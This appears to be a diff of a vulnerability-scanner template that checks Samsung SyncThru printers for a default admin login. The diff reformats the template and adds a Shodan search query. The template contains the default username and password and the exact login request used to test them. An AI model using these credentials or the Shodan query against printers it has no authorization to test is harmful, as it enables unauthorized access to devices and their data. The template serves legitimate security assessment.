@@ -1,11 +1,10 @@
 id: samsung-printer-default-login
-
 info:
   name: Samsung Printer - Default Login
   author: gy741
   severity: high
   description: |
-    Samsung printers default login credentials were discovered.
+    Samsung printers contain a default admin login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
   reference:
     - https://support.hp.com/gb-en/document/c05591673
   classification:
@@ -15,41 +14,37 @@ info:
     cpe: cpe:2.3:h:samsung:scx-6555n:*:*:*:*:*:*:*:*
   metadata:
     runzero-match: any(each(service["html.titles"]), {# matches "SyncThru Web Service"})
-    verified: true
     max-request: 1
+    product: scx-6555n
+    shodan-query: title:"SyncThru Web Service"
     vendor: samsung
-  tags: default-login,iot,samsung,printer,vuln
-
+    verified: true
+  tags: default-login,iot,printer,samsung,vuln
 http:
-  - raw:
+  - attack: pitchfork
+    matchers:
+      - condition: and
+        part: body
+        type: word
+        words:
+          - 'success: true'
+          - passwordExpiration
+      - part: header
+        type: word
+        words:
+          - text/html
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    payloads:
+      password:
+        - sec00000
+      username:
+        - admin
+    raw:
       - |
         POST /sws/app/gnb/login/login.jsp HTTP/1.1
         Host: {{Hostname}}
 
         Authentication=Basic {{base64(username + ':' + password)}}
-
-    attack: pitchfork
-    payloads:
-      username:
-        - admin
-      password:
-        - sec00000
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "success: true"
-          - "passwordExpiration"
-        condition: and
-
-      - type: word
-        part: header
-        words:
-          - "text/html"
-
-      - type: status
-        status:
-          - 200
-
